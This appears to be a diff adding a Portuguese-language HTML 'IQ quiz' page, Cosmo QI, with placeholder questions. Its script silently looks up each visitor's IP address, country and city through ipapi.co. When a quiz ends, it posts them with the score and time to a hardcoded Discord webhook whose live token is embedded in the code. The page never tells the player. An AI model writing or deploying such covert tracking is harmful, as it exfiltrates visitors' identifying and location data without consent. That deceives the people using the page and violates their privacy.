@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Cosmo QI</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root{
+  --easy:#22c55e;
+  --medium:#facc15;
+  --hard:#ef4444;
+  --card:#0f172a;
+}
+
+body{
+  margin:0;
+  font-family:'Segoe UI',Arial,sans-serif;
+  background:radial-gradient(circle at top,#020617,#000);
+  color:#fff;
+  min-height:100vh;
+}
+
+header{
+  text-align:center;
+  padding:20px;
+  font-size:28px;
+  font-weight:bold;
+}
+
+.container{
+  max-width:420px;
+  margin:auto;
+  padding:20px;
+}
+
+.card{
+  background:var(--card);
+  padding:25px;
+  border-radius:20px;
+  box-shadow:0 0 40px rgba(0,0,0,.6);
+}
+
+.menu button,
+.answers button,
+.back{
+  width:100%;
+  padding:15px;
+  margin:10px 0;
+  border:none;
+  border-radius:999px;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:.2s;
+}
+
+.menu button:hover,
+.answers button:hover,
+.back:hover{
+  transform:scale(1.05);
+}
+
+.easy{background:var(--easy);color:#000;}
+.medium{background:var(--medium);color:#000;}
+.hard{background:var(--hard);color:#fff;}
+
+.answers button{background:#1e293b;color:#fff;}
+.back{background:#334155;color:#fff;}
+
+.progress{text-align:center;font-size:14px;color:#94a3b8;}
+.question{text-align:center;font-size:18px;margin:15px 0;}
+.qi{font-size:48px;color:#22c55e;}
+.hidden{display:none;}
+
+.record{
+  text-align:center;
+  font-size:14px;
+  color:#38bdf8;
+  margin-bottom:10px;
+}
+
+/* FADE */
+.fade{
+  opacity:0;
+  transform:translateY(10px);
+  transition:.3s;
+}
+.fade.show{
+  opacity:1;
+  transform:none;
+}
+</style>
+</head>
+
+<body>
+
+<header>🌌 Cosmo QI</header>
+
+<div class="container">
+
+<div class="card menu" id="menu">
+  <div class="record" id="record">🏆 Recorde: 0 QI</div>
+  <h3>Escolha a dificuldade</h3>
+  <button class="easy" onclick="start('easy')">🟢 Fácil</button>
+  <button class="medium" onclick="start('medium')">🟡 Médio</button>
+  <button class="hard" onclick="start('hard')">🔴 Difícil</button>
+</div>
+
+<div class="card hidden" id="quiz">
+  <button class="back" onclick="backToMenu()">⬅ Voltar</button>
+  <div class="progress" id="progress"></div>
+  <div class="question fade" id="question"></div>
+  <div class="answers fade" id="answers"></div>
+</div>
+
+<div class="card hidden" id="result">
+  <h2>Resultado</h2>
+  <div class="qi" id="qi"></div>
+  <p id="msg"></p>
+  <button class="back" onclick="backToMenu()">⬅ Voltar</button>
+</div>
+
+</div>
+
+<script>
+/* ================= CONFIG ================= */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1454848754292228139/PVAyvVpp8_KTYY_wF9xW41q3n7GeHmXwtXx2_dpcujhM_C68L3snAz-ic4knH7HqfBsv";
+
+/* ===== IP / PAÍS ===== */
+let ipInfo = {
+  ip: "desconhecido",
+  country: "desconhecido",
+  city: "desconhecido"
+};
+
+fetch("https://ipapi.co/json/")
+  .then(r => r.json())
+  .then(d => {
+    ipInfo.ip = d.ip || "desconhecido";
+    ipInfo.country = d.country_name || "desconhecido";
+    ipInfo.city = d.city || "desconhecido";
+  })
+  .catch(()=>{});
+
+/* ===== RECORD ===== */
+let bestQI = Number(localStorage.getItem("cosmoqi_record")) || 0;
+const recordEl = document.getElementById("record");
+recordEl.innerText = "🏆 Recorde: " + bestQI + " QI";
+
+/* ===== PERGUNTAS ===== */
+const data = {
+  easy: Array.from({length:10},(_,i)=>[`2 + ${i+1} = ?`,["1","2","3"],1]),
+  medium: Array.from({length:20},(_,i)=>[`5 × ${i+1} = ?`,["10","20","30"],0]),
+  hard: Array.from({length:30},(_,i)=>[`Sequência lógica ${i+1}`,["A","B","C"],0])
+};
+
+let quiz=[],current=0,score=0,difficulty="";
+
+/* ===== START ===== */
+function start(level){
+  difficulty=level;
+  quiz=[...data[level]].sort(()=>Math.random()-0.5);
+  current=0;
+  score=0;
+  show("quiz");
+  load();
+}
+
+/* ===== LOAD ===== */
+function load(){
+  const q=quiz[current];
+  const questionEl=document.getElementById("question");
+  const answersEl=document.getElementById("answers");
+
+  questionEl.classList.remove("show");
+  answersEl.classList.remove("show");
+
+  setTimeout(()=>{
+    document.getElementById("progress").innerText =
+      `Pergunta ${current+1} de ${quiz.length}`;
+
+    questionEl.innerText=q[0];
+    answersEl.innerHTML="";
+
+    q[1].forEach((t,i)=>{
+      const b=document.createElement("button");
+      b.innerText=t;
+      b.onclick=()=>answer(i===q[2]);
+      answersEl.appendChild(b);
+    });
+
+    questionEl.classList.add("show");
+    answersEl.classList.add("show");
+  },300);
+}
+
+/* ===== ANSWER ===== */
+function answer(ok){
+  if(ok) score++;
+  current++;
+  current<quiz.length ? load() : result();
+}
+
+/* ===== RESULT + LOG DISCORD ===== */
+function result(){
+  show("result");
+
+  const qi = Math.round((score/quiz.length)*200);
+  document.getElementById("qi").innerText = qi + " QI";
+
+  document.getElementById("msg").innerText =
+    qi>=180?"Gênio absoluto 🧠🔥":
+    qi>=140?"Muito acima da média 👏":
+    qi>=100?"Boa lógica 😄":
+    qi>=60?"Dentro da média 👍":
+    "Continue treinando 💪";
+
+  if(qi>bestQI){
+    bestQI=qi;
+    localStorage.setItem("cosmoqi_record",qi);
+    recordEl.innerText="🏆 Recorde: "+qi+" QI";
+  }
+
+  fetch(WEBHOOK_URL,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      username:"Cosmo QI Logs",
+      embeds:[{
+        title:"🧠 Novo Resultado",
+        color:5793266,
+        fields:[
+          {name:"Dificuldade",value:difficulty,inline:true},
+          {name:"Pontuação",value:`${score}/${quiz.length}`,inline:true},
+          {name:"QI",value:qi.toString(),inline:true},
+          {name:"IP",value:ipInfo.ip},
+          {name:"País",value:ipInfo.country,inline:true},
+          {name:"Cidade",value:ipInfo.city,inline:true},
+          {name:"Horário",value:new Date().toLocaleString("pt-BR")}
+        ]
+      }]
+    })
+  });
+}
+
+/* ===== MENU ===== */
+function backToMenu(){
+  show("menu");
+}
+
+function show(id){
+  ["menu","quiz","result"].forEach(x=>
+    document.getElementById(x).classList.add("hidden")
+  );
+  document.getElementById(id).classList.remove("hidden");
+}
+</script>
+
+</body>
+</html>
